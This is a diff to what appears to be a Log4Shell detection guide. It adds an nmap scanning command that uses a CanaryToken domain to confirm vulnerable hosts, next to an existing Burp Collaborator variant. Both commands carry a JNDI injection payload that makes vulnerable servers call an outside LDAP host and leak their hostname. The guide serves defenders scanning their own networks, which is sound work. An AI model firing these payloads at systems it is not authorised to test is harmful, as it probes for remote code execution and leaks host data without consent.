@@ -38,6 +38,14 @@ Take your domain from Burp collaborator and replace xxxx with your domain:
 nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.burpcollaborator.net/diverto}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
 ```
 
+### By help of CanaryToken (https://canarytokens.org/generate#)
+
+Take your Token from CanaryToken and replace xxxx with your domain:
+
+```
+nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://x${hostName}.L4J.xxxx.canarytokens.com/a}"' -T4 -n -pssh,imap*,http* --script-timeout=1m MY.IPs.TO.SCAN
+```
+
 # Solution/Fixes
 
 List of best fixes and workarounds.
